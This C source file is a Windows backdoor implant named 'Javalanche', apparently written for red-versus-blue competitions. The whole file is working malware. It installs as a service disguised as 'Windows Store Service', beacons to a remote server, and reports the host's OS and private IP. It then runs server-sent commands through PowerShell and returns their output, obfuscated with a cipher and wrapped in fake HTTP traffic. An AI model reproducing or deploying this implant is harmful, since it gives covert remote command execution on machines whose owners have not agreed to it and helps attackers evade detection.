/*
Javalanche Windows Executable
Purpose: Contains both Main method, as well as Service Methods for the exeuctable to run as a service
Author: James Southcott
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <process.h>
#include <ws2tcpip.h>
#include <time.h>
#include "caesarCipher.h"
#include "keepAlive.h"
#include "resolveServerAddr.h"
#pragma comment(lib,"ws2_32.lib")
#define _CRT_SECURE_NO_WARNINGS

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(DWORD argc, LPTSTR* argv);
void ControlHandler(DWORD request);

SOCKET clientSocket;

/*
Name: main
Purpose: Entry point for the code. Calls ServiceMain()
Parameters: None
Returns: None
*/
int main(void) {
    // Connect main thread to the service control messanger
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {(LPWSTR)TEXT("Windows Store Service"), (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        printf("Failed to Start Service\n");
    }

    return 0;
}

/*
Name: ServiceMain
Purpose: Entry Point for the Windows Service
Parameters: argc, argv (both are NULL)
Returns: None
Note: If Starting Service returns a generic error, to ensure that linking is not a apart of the issue, within Visual Studio, set C\C++ > Code Generation > Runtime Library to Multi-Threaded
*/
void ServiceMain(DWORD argc, LPTSTR* argv) {
    hStatus = RegisterServiceCtrlHandler(TEXT("Windows Store Service"), (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
        // Handle error
        return;
    }

    // Initialize service status
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    // Report initial status to SCM
    SetServiceStatus(hStatus, &ServiceStatus);

    // Service initialization code here

    // Report running status when initialization is complete
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    /////////////////////////////////////
    //   START OF NON-SERVICE CODE     //
    /////////////////////////////////////

    // Initialize the Socket, and server address variables
    WSADATA sockData;
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));

    WSAStartup(MAKEWORD(2, 2), &sockData);

    char serverMessage[1024];
    for (int i = 0; i < 1024; i++) serverMessage[i] = '\0';

    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        perror("Error creating socket");
        exit(-1);
    }

    // Set up server address and port
    char serverIPAddress[16];
    int dnsResolveResult = resolveBeaconServerIPAddr(serverIPAddress);
    if (dnsResolveResult != 0) {
        printf("Could not reach a Beacon Server");
        exit(-1);
    }

    wchar_t wideServerIPAddress[20];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, wideServerIPAddress, sizeof(wideServerIPAddress) / sizeof(wchar_t), serverIPAddress, _TRUNCATE);
    serverAddr.sin_family = AF_INET;
    InetPton(AF_INET, wideServerIPAddress, &serverAddr.sin_addr.s_addr);
    serverAddr.sin_port = htons(80);

    // Connect to server
    int result = connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result != 0) {
        int error = WSAGetLastError();
        printf("Error Code: %d\n", error);
        exit(error);
    }

    // The first message sent to the Server is the OS
    const char* osMessage = "Windows\n";
    send(clientSocket, osMessage, strnlen(osMessage, 8), 0);

    // The second message sent to the Server is the host address.
    // The host address is needed, as in a traditional red vs blue competition, most of the 
    // Infrastructure is sitting behind NAT, while the Proxy server is publicly acessible.
    // So instead of specifying clients by their Natted IP Address, we'd rather look at thier
    // Private IP address that is unique for that competition
    char host[256];
    char ipstr[INET_ADDRSTRLEN + 2];
    struct addrinfo hints, * res, * p;
    int status;

    // Get the hostname
    gethostname(host, sizeof(host));

    // Set up the hints structure
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    // Get address information
    status = getaddrinfo(host, NULL, &hints, &res);

    // Loop through all the results and get the first IPv4 address
    for (p = res; p != NULL; p = p->ai_next) {
        void* addr = NULL;
        if (p->ai_family == AF_INET) {
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
            addr = &(ipv4->sin_addr);

            // Convert the IP to a string
            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
            int len = strnlen(ipstr, 16);
            ipstr[len + 1] = '\0';
            ipstr[len] = '\n';
            send(clientSocket, ipstr, strnlen(ipstr, 17), 0);

            // Break after the first IP address is found
            break;
        }
    }

    // Free the linked list
    freeaddrinfo(res);

    // Start a thread to send a keep alive message every 30 seconds to the Server
    HANDLE keepAliveThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);

    // Main service loop
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        // Get message from Server
        int bytesRead = recv(clientSocket, serverMessage, 1023, 0);
        serverMessage[bytesRead] = '\0';

        // Because the Connecttion is disguised in HTTP, there are a handful of headers we don't care about.
        // To do this, we just move the pointer past the wherever the substring variable is found
        const char* substring = "charset=utf-8\r\n\r\n";
        char* startOfActualData = strstr(serverMessage, substring);
        startOfActualData += strnlen(substring, 19);
        strcpy_s(serverMessage, sizeof(serverMessage), startOfActualData);

        // Decrypt the Message from the server
        encrypt(serverMessage);
        const char* keepAlive = "KEEP_ALIVE\n";

        // Check to make sure the message isn't a keep alive message
        if (strncmp(serverMessage, keepAlive, 11) != 0) {
            // Create the string to run the command in the format "Powershell.exe -Command /"[cmdlet]/"
            char command[1100] = "Powershell.exe -Command \"";
            strcat_s(command, rsize_t(1100), serverMessage);
            strcat_s(command, rsize_t(1100), "\"");

            // Create variables to run and store command output
            char* commandOutput = (char*)calloc(8192, sizeof(char));
            FILE* pipe;
            char* messageToSendBack = (char*)calloc(16384, sizeof(char));

            // Open the command for reading
            pipe = _popen(command, "r");
            if (pipe == NULL) {
                printf("Error opening pipe.\n");
            }

            // Get all of the output from the command, and put it all into one string
            while (fgets(commandOutput, 8100, pipe) != NULL) {
                strncat_s(messageToSendBack, rsize_t(16384), commandOutput, rsize_t(8190));
            }
            strncat_s(messageToSendBack, rsize_t(16384), "END_OF_OUTPUT", 16);

            // strncat_s appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
            encrypt(messageToSendBack);
            int len = strnlen(messageToSendBack, 16384);
            messageToSendBack[len] = '\n';
            messageToSendBack[len + 1] = '\0';

            // Disguise the command output in an HTTP Header
            char message[8292] = "HTTP/1.1 200 OK\r\nContent-Length: ";
            char messageSize[6];
            sprintf_s(messageSize, "%d", (int)strnlen(messageToSendBack, 16384));
            strncat_s(message, messageSize, 6);
            char endMessage[46] = "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
            strncat_s(message, endMessage, 46);
            strncat_s(message, messageToSendBack, 16384);


            send(clientSocket, messageToSendBack, strnlen(messageToSendBack, 16384), 0);

            // Close the pipe
            _pclose(pipe);
        }
    }

    // Cleanup and shutdown
    closesocket(clientSocket);
    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
}

/*
Name: ControlHandler
Purpose: Handles requests from the Windows Service Control Manager to stop/shutdown the service
Parameters: request - the request made by the Windows Service Control Manager
Returns: Void
*/
void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hStatus, &ServiceStatus);

        // Perform cleanup tasks

        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        closesocket(clientSocket);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        // Handle shutdown tasks
        closesocket(clientSocket);
        break;

    default:
        break;
    }
}